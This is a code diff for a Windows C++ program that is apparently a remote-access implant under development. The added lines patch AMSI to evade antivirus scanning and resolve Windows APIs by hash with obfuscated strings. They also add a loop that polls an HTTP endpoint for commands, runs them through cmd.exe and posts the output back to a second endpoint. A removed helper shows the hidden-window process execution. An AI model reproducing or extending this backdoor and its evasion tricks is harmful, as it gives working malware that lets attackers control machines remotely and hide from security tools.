@@ -324,12 +324,6 @@
 //}
 
 
-
-
-#include "HttpClient.h"
-
-using namespace HttpLib;
-
 //void PrintResponse(HttpResponse* response) {
 //    if (!response) return;
 //
@@ -357,75 +351,17 @@ using namespace HttpLib;
 //    }
 //}
 //
-//std::string Exec(wchar_t* command)
-//{
-//    SECURITY_ATTRIBUTES sa{};
-//    sa.nLength = sizeof(sa);
-//    sa.bInheritHandle = TRUE;
-//
-//    HANDLE hRead = nullptr;
-//    HANDLE hWrite = nullptr;
-//
-//    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
-//        return "";
-//
-//    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
-//
-//    STARTUPINFOW si{};
-//    si.cb = sizeof(si);
-//    si.dwFlags = STARTF_USESTDHANDLES;
-//    si.hStdOutput = hWrite;
-//    si.hStdError = hWrite;
-//
-//    PROCESS_INFORMATION pi{};
-//
-//    std::wstring cmd = L"cmd.exe /c " + command;
-//
-//    // CreateProcessW yêu cầu buffer có thể ghi
-//    std::wstring cmdline = cmd;
-//
-//    BOOL ok = CreateProcessW(
-//        nullptr,
-//        cmdline.data(),
-//        nullptr,
-//        nullptr,
-//        TRUE,
-//        CREATE_NO_WINDOW,
-//        nullptr,
-//        nullptr,
-//        &si,
-//        &pi);
-//
-//    CloseHandle(hWrite);
-//
-//    if (!ok)
-//    {
-//        CloseHandle(hRead);
-//        return "";
-//    }
-//
-//    std::string output;
-//    char buffer[4096];
-//    DWORD bytesRead = 0;
-//
-//    while (ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, nullptr) && bytesRead)
-//    {
-//        output.append(buffer, bytesRead);
-//    }
-//
-//    WaitForSingleObject(pi.hProcess, INFINITE);
-//
-//    CloseHandle(hRead);
-//    CloseHandle(pi.hProcess);
-//    CloseHandle(pi.hThread);
-//
-//    return output;
-//}
 
+#include "HttpClient.h"
+#include "CRT.h"
 #include "ApiResolve.h"
 #include "HashString.h"
+#include "Custom.h"
+
+using namespace HttpLib;
 
 int main() {
+    PathAmsi();
     ApiResolve api;
     constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
     LPVOID lpKernel32 = api.GetModuleBaseAddress(hashKernel32);
@@ -438,7 +374,6 @@ int main() {
     _LoadLibraryA pLoadLibraryA = (_LoadLibraryA)api.GetApiAddress(lpKernel32, hashLoadLibraryA);
     const char sDll[] = {'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0'};
     pLoadLibraryA(sDll);
-	//wchar_t url[] = {L'h', L't', L't', L'p', L's', L':', L'/', L'/', L'h', L't', L't', L'p', L'b', L'i', L'n', L'.', L'o', L'r', L'g', L'/', L'g', L'e', L't', L'\0'};
     wchar_t url[] = {L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'0', L'8', L'0', L'/', L'p', L'o', L'l', L'l', L'\0'};
     wchar_t url2[] = { L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'0', L'8', L'0', L'/', L'r', L'e', L's', L'u', L'l', L't', L'\0'};
     HttpClient client;
@@ -456,34 +391,15 @@ int main() {
         L'c', L'm', L'd', L'.', L'e', L'x', L'e',
         L'\0'
         };
-    typedef BOOL
+
+    typedef VOID
         (WINAPI*
-        _CreateProcessA)(
-            LPCWSTR               lpApplicationName,
-            LPWSTR                lpCommandLine,
-            LPSECURITY_ATTRIBUTES lpProcessAttributes,
-            LPSECURITY_ATTRIBUTES lpThreadAttributes,
-            BOOL                  bInheritHandles,
-            DWORD                 dwCreationFlags,
-            LPVOID                lpEnvironment,
-            LPCWSTR               lpCurrentDirectory,
-            LPSTARTUPINFOW        lpStartupInfo,
-            LPPROCESS_INFORMATION lpProcessInformation
+        _Sleep)(
+            _In_ DWORD dwMilliseconds
         );
-    constexpr unsigned int hashCreateProcessW = ComplexHashForAnsi("CreateProcessW");
-    _CreateProcessA pCreateProcessW = (_CreateProcessA)api.GetApiAddress(lpKernel32, hashCreateProcessW);
-    //BOOL ok = pCreateProcessA(
-    //    path, // lpApplicationName
-    //    NULL,                             // lpCommandLine
-    //    NULL,                             // lpProcessAttributes
-    //    NULL,                             // lpThreadAttributes
-    //    FALSE,                            // bInheritHandles
-    //    0,                                // dwCreationFlags
-    //    NULL,                             // lpEnvironment
-    //    NULL,                             // lpCurrentDirectory
-    //    &si,                              // lpStartupInfo
-    //    &pi                               // lpProcessInformation
-    //);
+
+    constexpr unsigned int hashSleep = ComplexHashForAnsi("Sleep");
+    _Sleep pSleep = (_Sleep)api.GetApiAddress(lpKernel32, hashSleep);
 
     while (1) {
         HttpResponse response;
@@ -492,13 +408,18 @@ int main() {
         client.Get(&response, url);
 
         if (response.bodyLength) {
-            //PrintResponse(&response);
-            //std::string res = Exec(response.body);
-                        
-            client.Post(&response, url2, L"hehe", 4);
+            wchar_t* output = NULL;
+            if (Exec(response.body, &output)) {
+                if (crt_wcslen(output)) {
+                    client.Post(&response, url2, output, crt_wcslen(output));
+                }
+            }
         }
 
         HttpResponse_Free(&response);
+
+
+        pSleep(1000);
     }
 
 }
